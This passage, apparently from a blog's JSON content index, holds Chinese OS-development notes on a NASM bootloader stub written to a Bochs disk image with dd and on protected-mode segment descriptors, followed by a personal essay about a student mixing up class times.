0xaa\n\n这段测试代码的目的就是读取从地址2开始的内容，然后写到0x900处，最后跳转到0x900处。但是我们并没有loader内容……让我们再编一个二进制文件，给他放上点东西\n%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRmov byte [gs:0x00], &#x27;2&#x27; mov byte [gs:0x01], 0xa4mov byte [gs:0x02], &#x27; &#x27;mov byte [gs:0x03], 0xa4mov byte [gs:0x04], &#x27;L&#x27;mov byte [gs:0x05], 0xa4mov byte [gs:0x06], &#x27;O&#x27;mov byte [gs:0x07], 0xa4mov byte [gs:0x08], &#x27;A&#x27;mov byte [gs:0x09], 0xa4mov byte [gs:0x0a], &#x27;D&#x27;mov byte [gs:0x0b], 0xa4    mov byte [gs:0x0c], &#x27;E&#x27;mov byte [gs:0x0d], 0xa4mov byte [gs:0x0e], &#x27;R&#x27;mov byte [gs:0x0f], 0xa4 ;每个打印的字符占2个字节大小，低字节是字符ascii码，高字节是颜色和显示模式。0xa4代表绿色背景闪烁，前景色为红色(RGB)jmp $\n\n这就是loader.S，编译成loader.bin后我们把它放到第二扇区上去\nnasm -o loader.bin loader.Sdd if=./loader.bin of=./hd60M.img bs=512 count=1 seek=2 conv=notrunc\n\n写入虚拟硬盘中的时候seek&#x3D;2，意思就是跳过两个块，在第二扇区\n启动bochs，如果一切顺利，mbr将把第二扇区上的数据读取到0x900地址上并跳转到那里，往显存上写入2 loader这几个字符并出现在窗口上\n\n真好。绿底的2 loader不断闪动，就像20世纪的单机游戏通关彩蛋一样。\n保护模式之前我们都是在实模式上学习和实践的，对标的就是8086处理器，16位，段寄存器+偏移寄存器寻址，但是实模式没有权限的概念，操作系统能到的内存用户也能到，安全性比较差，而且一次性只能运行一个程序，最大内存也只有1mb，所以之后出现了平坦模式，用一个32位寄存器就能寻址所有的地址，还有保护模式，寄存器增宽，使用段描述符寻址。但是由于兼容的原因，所以会出现16bit和32bit操作的相互转换，就是反转前缀，0x66和0x67，这里不多说。\n段描述符为了区别各个内存片段之间的特征和权限，比如代码段就可读可执行不可写，数据段就可读可写不可执行，我们需要给各个内存段一点空间描述它的级别、大小之类的约束属性。，这就是段描述符\n\n这样的一个段描述符一共8字节，这本书提到的各类描述符都是8字节。\n首先能注意到段基址和段界限，保护模式下地址总线宽度32位，所以必须要32位来描述这个段的位置，就是段基址，但是你会发现这32位段基址居然还不在一起，历史遗留问题。\n段界限就是这个段最大有多大，假如在这个段中访问的位置超过了段基址+段界限，那么就会触发异常。同时对于数据段和代码段，数据往高的内存地址增长，对于栈，数据往低的内存地址增长，相对应的段界限计算也不同。你可能还会注意到，段界限也是分散的。实际上还有一个G位和段界限有关系，如果G位是0，那么段边界就是段基址+段界限，如果是1，就是段基址+段界限*4kb\n对于高32位来说，首先S为0代表该段为系统段，为1就是数据段。根据S代表不同的系统与数据段，占4位的type会代表的段类型也会不同，详细如下\n\n书中主要说明了非系统段的type作用，RC位代表的读写执行是不是有种熟悉的感觉……\nX代表代码段或数据段，代码段不可写，数据段不可执行。A由cpu设置，代表有没有被cpu访问过，如果有就置1。C代表一致性代码段，，，\n\n一致性代码段是指如果自己是转移的目标段，并且自己是一致性代码段，自己的特权级一定要高于当前特权级，转移后的特权级不与自己的 DPL 为主，而是与转移前的低特权级一致，也就是听从、依从转移前的低特权级。C 为 1 时则表示该段是一致性代码段，C 为 0 时则表示该段为非一致性代码段。\n\n好抽象……\nE代表向下或者向上拓展，对应之前说的代码段、数据段和栈段。\n段描述符的13-14位是DPL段，Descriptor Privilege Level，描述特权等级，分为0、1、2、3，数字越小特权越大，用户程序处于3，操作系统处于0。\nP段表示present，是否存在，如果检查到为0CPU就会抛出异常。有种绕过失败的既视感……\nAVL字段用来设置是否为64位代码段，1就是，否则代表32位\nD&#x2F;B，对于代码段此为D位，D为0，指令的有效地址和操作数就是16位，D为1就是32位；对于栈段，此为B位。B为0，使用sp寄存器，就是16位，B为1，使用esp，32位。\nG字段，用来指定段界限的单位，1字节或者4kb，前文已述。\n","categories":["operating_system"],"tags":["to_do_list","operating_system"]},{"title":"奇妙冒险之一","url":"/2024/11/04/%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A9%E4%B9%8B%E4%B8%80/","content":"烂账10月31日的清晨，被舍友的洗漱声吵醒。前天晚上看手机到晚上2点，但睡眠质量出奇的好，丝毫没有困意。我还想再发会呆，但有早八的数电，拖着身子下床收拾东西。\n换了班之后我每天都要核对自己的课表，同寝还有另外一个舍友和我课表重合，几乎每个有早八的上午起床后我都要问一句今天是不是要上什么课。但今天他没回答我。我看了眼手机已经50了，他坐在座位上很安逸地吃面包。\n“你不急吗？”\n没等他回答，旁边另一个室友说：\n“我们在三教都不急，你急什么。”\n数电要去二教上，三教的确比二教远得多。\n我把书拿好鞋子换上他还在吃早餐。看了一眼，我走出门。\n一大早外面却十分晴朗。时间紧，我决定不吃早餐。一边走我一边回忆昨天晚上干了什么，10点多跑了场步，回到宿舍在QQ上随便找了个同班同学问了几句作业的事之后就一直在看手机……晚上熄灯后好像还看了道题目。记忆遥远的要死，根本就想不起来考的什么。\n很快到了二教，上四楼走进教室。我刚从前门走进，立马又从后门走了出去。\n教室里一个人都不认得。\n我查了课表仔细对照了门牌，抱着忐忑重新走进教室。后面一个男生在面无表情地玩明日方舟。看清楚他在看录像之后我毫不犹豫地打断他：\n“这节课是数电吗？”\n话刚出口我就后悔了，他桌上放了本“信息”什么什么的，反正不是数字电路。\n——————————————————————————————————————————————————————\n我深知大难不死，必有后福的道理。在教室外我又在QQ上找了那个昨天晚上刚搭过话的同班同学，得知数电课取消了。抱着喜悦的心情，我回复说他真勤快。想不到有人没早八还起这么早。\n真好，被迫早起的清晨，明媚的天气，毫无困意。我想到如果我直接睡过去可能都会后悔错过了这样一个早晨。\n我决定去跑个步打个卡，再去吃早餐，回宿舍再看看昨晚那道题目。\n空腹跑步会不会对身体有害？\n问问gpt。呵呵，想不到这时候我第一个念头居然是问gpt。\n只不过我的确很好奇ai会怎么说。重新拿出手机，消息提醒弹出一个问号，是那个刚问过的同学。可能他真的觉得每天早上8点起床是很容易的事。一边想我一边走出了二教，外面阳光明媚，让人感到温暖，空气中回旋着微风的气息，少有的好天气，耳旁仿佛响起《Whirling-In-Rags, 8 AM》的旋律。我看了眼手机，瞬间觉得天旋地转。\n10点过5分。\n手机的问题，我第一时间想到。\n这时候找个路边的人问现在是不是10点了一定愚蠢无比，\n但我还是这么做了。\n是的，现在的确10点了。在二教里主观上短短几分钟实际上过去了2小时，一些时空扭曲，次元穿梭的概念闪现到我脑海中，可能我在走出二教大门时不小心踏入了另一条时间线，这条时间线比我的主宇宙快那么2小时。完蛋，我突然想起在哪里看到过一句话，不好好学习，生命中就会多出许多奇迹。\n傻瓜。当务之急是10点15确有一堂大物实验，在距离2教15分钟步程的实验楼，于是我马上狂奔起来。\n","categories":["深夜小短文， 奇妙冒险"],"tags":["深夜小短文"]}]